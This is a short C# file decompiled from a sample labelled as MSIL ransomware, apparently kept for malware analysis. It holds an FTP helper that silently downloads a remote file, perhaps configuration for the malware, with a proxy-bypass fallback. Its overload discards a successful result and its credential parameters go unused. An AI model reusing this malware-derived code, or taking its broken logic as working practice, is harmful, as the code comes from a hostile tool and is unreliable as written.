// Decompiled with JetBrains decompiler
// Type: ProxyService.FtpHelper
// Assembly: ProxyService, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 8A4756A5-2150-40F9-90C4-9A8E485808F2
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00080-msil\Trojan-Ransom.MSIL.Proxy.a-49083ed967969788acc63c6c38a22377a353de59b937fe8ca52b9aa5daac13cb.exe

using System;
using System.IO;
using System.Net;

namespace ProxyService
{
  public class FtpHelper
  {
    public static string GetXml(string uri, string user, string pass, bool noproxy)
    {
      try
      {
        FtpWebRequest ftpWebRequest = (FtpWebRequest) WebRequest.Create(uri);
        ftpWebRequest.Method = "RETR";
        if (noproxy)
          ftpWebRequest.Proxy = (IWebProxy) null;
        FtpWebResponse response = (FtpWebResponse) ftpWebRequest.GetResponse();
        StreamReader streamReader = new StreamReader(response.GetResponseStream());
        string end = streamReader.ReadToEnd();
        streamReader.Close();
        response.Close();
        return end;
      }
      catch (Exception ex)
      {
      }
      return "";
    }

    public static string GetXml(string uri, string user, string pass) => FtpHelper.GetXml(uri, user, pass, false) == "" ? FtpHelper.GetXml(uri, user, pass, true) : "";
  }
}
